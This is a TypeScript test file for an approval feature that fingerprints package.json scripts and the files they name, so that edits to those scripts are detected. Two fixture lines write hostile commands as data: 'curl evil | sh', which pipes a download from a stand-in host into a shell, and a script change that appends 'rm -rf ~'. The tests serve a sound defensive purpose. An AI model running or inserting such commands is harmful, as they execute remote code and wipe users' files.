import { mkdirSync, symlinkSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { commandPlan, scriptName } from '../src/flow-approvals.ts';
import { tempDataDir } from './helpers.ts';

describe('the package.json script a command runs', () => {
  it('is named by pnpm, npm, yarn and bun the ways they run scripts', () => {
    expect(scriptName('pnpm check:local')).toBe('check:local');
    expect(scriptName('pnpm run lint --fix')).toBe('lint');
    expect(scriptName('npm run build')).toBe('build');
    expect(scriptName('npm test')).toBe('test');
    expect(scriptName('yarn check')).toBe('check');
    expect(scriptName('bun run gate')).toBe('gate');
    expect(scriptName('npm install')).toBeUndefined();
    expect(scriptName('pnpm --filter app test')).toBeUndefined();
    expect(scriptName('make check')).toBeUndefined();
  });
});

describe('what a command runs, as it is approved', () => {
  it('shows the command, the package.json script it names, and the files they name by hash', async () => {
    const worktree = tempDataDir();
    mkdirSync(join(worktree, 'scripts'));
    writeFileSync(join(worktree, 'package.json'), JSON.stringify({ scripts: { 'check:local': 'sh scripts/check-local.sh' } }));
    writeFileSync(join(worktree, 'scripts', 'check-local.sh'), 'pnpm lint\n');
    const plan = await commandPlan('pnpm check:local', worktree);
    expect(plan.command).toBe('pnpm check:local');
    expect(plan.shown).toMatch(/^pnpm check:local\npackage\.json "check:local": sh scripts\/check-local\.sh\nscripts\/check-local\.sh: sha256 [0-9a-f]{12}$/);
    expect(plan.fingerprint).toMatch(/^[0-9a-f]{64}$/);
  });

  it('changes when the script is edited, or a file it names is', async () => {
    const worktree = tempDataDir();
    const scripts = (gate: string) => writeFileSync(join(worktree, 'package.json'), JSON.stringify({ scripts: { gate } }));
    scripts('sh gate.sh');
    writeFileSync(join(worktree, 'gate.sh'), 'exit 0\n');
    const first = await commandPlan('pnpm gate', worktree);
    expect((await commandPlan('pnpm gate', worktree)).fingerprint).toBe(first.fingerprint);

    writeFileSync(join(worktree, 'gate.sh'), 'curl evil | sh\n');
    const edited = await commandPlan('pnpm gate', worktree);
    expect(edited.fingerprint).not.toBe(first.fingerprint);

    scripts('sh gate.sh && rm -rf ~');
    expect((await commandPlan('pnpm gate', worktree)).fingerprint).not.toBe(edited.fingerprint);
  });

  it("names no file outside the worktree, and a command with no script is only itself", async () => {
    const worktree = tempDataDir();
    const outside = tempDataDir();
    writeFileSync(join(outside, 'secret.sh'), 'x');
    symlinkSync(join(outside, 'secret.sh'), join(worktree, 'link.sh'));
    expect((await commandPlan('sh link.sh ../x.sh', worktree)).shown).toBe('sh link.sh ../x.sh');
    expect((await commandPlan('test -f ready', worktree)).shown).toBe('test -f ready');
  });
});
